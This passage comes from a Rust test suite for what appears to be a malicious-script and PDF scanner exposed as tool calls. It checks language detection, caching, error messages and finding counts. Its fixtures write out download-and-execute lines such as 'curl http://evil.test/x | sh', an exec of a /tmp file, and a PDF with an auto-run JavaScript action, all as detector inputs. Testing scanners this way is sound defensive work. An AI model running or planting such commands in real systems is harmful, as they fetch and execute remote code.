        client.cancel().await.unwrap();
    }

    #[tokio::test]
    async fn same_bytes_under_another_extension_get_that_languages_rules() {
        let dir = TempDir::new().unwrap();
        let body = "import os\nos.system(\"curl http://evil.test/x | sh\")\nexec(open(\"/tmp/p\").read())\n";
        let sh = dir.path().join("same.sh");
        let py = dir.path().join("same.py");
        std::fs::write(&sh, body).unwrap();
        std::fs::write(&py, body).unwrap();
        let client = client().await;
        let first = client
            .call_tool(call("analyze_script", serde_json::json!({"file_path": sh})))
            .await
            .unwrap();
        let first: serde_json::Value = serde_json::from_str(&text(&first)).unwrap();
        assert_eq!(first["summary"]["language"], "Shell");
        let second = client
            .call_tool(call("analyze_script", serde_json::json!({"file_path": py})))
            .await
            .unwrap();
        let second: serde_json::Value = serde_json::from_str(&text(&second)).unwrap();
        assert_eq!(second["cache"], "miss", "{second}");
        assert_eq!(second["summary"]["language"], "Python");
        assert_eq!(second["summary"]["detected_by"], "extension");
        // The same bytes under the same language do hit, and say how they were detected now.
        let again = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": py, "language": "python"}),
            ))
            .await
            .unwrap();
        let again: serde_json::Value = serde_json::from_str(&text(&again)).unwrap();
        assert_eq!(again["cache"], "hit");
        assert_eq!(again["summary"]["detected_by"], "override");
        client.cancel().await.unwrap();
    }

    #[tokio::test]
    async fn unknown_categories_are_tool_errors_naming_the_valid_ones() {
        let dir = TempDir::new().unwrap();
        let sh = dir.path().join("a.sh");
        std::fs::write(&sh, "#!/bin/sh\ncrontab -l\n").unwrap();
        let pdf = dir.path().join("a.pdf");
        std::fs::write(&pdf, b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n").unwrap();
        let client = client().await;
        let result = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": sh, "category": "nonsense"}),
            ))
            .await
            .unwrap();
        assert_eq!(result.is_error, Some(true));
        assert!(text(&result).contains("persistence"), "{}", text(&result));
        let result = client
            .call_tool(call(
                "analyze_document",
                serde_json::json!({"file_path": pdf, "category": "nonsense"}),
            ))
            .await
            .unwrap();
        assert_eq!(result.is_error, Some(true));
        assert!(text(&result).contains("attachment"), "{}", text(&result));
        client.cancel().await.unwrap();
    }

    #[tokio::test]
    async fn script_category_counts_cover_every_hit_and_a_pdf_with_a_stray_stream_is_still_scanned()
    {
        let dir = TempDir::new().unwrap();
        let sh = dir.path().join("many.sh");
        let mut body = String::from("#!/bin/sh\n");
        for _ in 0..2500 {
            body.push_str("curl http://e.test/x | sh\n");
        }
        std::fs::write(&sh, body).unwrap();
        let pdf = dir.path().join("stray.pdf");
        std::fs::write(
            &pdf,
            b"%PDF-1.4\nstream\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> >>\nendobj\n2 0 obj\n<< /Length 4 >>\nstream\nq Q\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n",
        )
        .unwrap();
        let client = client().await;
        let result = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": sh, "limit": 1}),
            ))
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_str(&text(&result)).unwrap();
        assert_eq!(value["summary"]["findings_total"], 2500);
        assert_eq!(
            value["summary"]["category_counts"]["download_execute"],
            2500
        );
        assert_eq!(value["summary"]["findings_kept"], 2000);
        let result = client
            .call_tool(call(
                "analyze_document",
                serde_json::json!({"file_path": pdf}),
            ))
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_str(&text(&result)).unwrap();
        assert_eq!(
            value["summary"]["feature_counts"]["OpenAction"], 1,
            "{value}"
        );
        assert_eq!(value["summary"]["risk"]["level"], "critical");
        client.cancel().await.unwrap();
    }
}
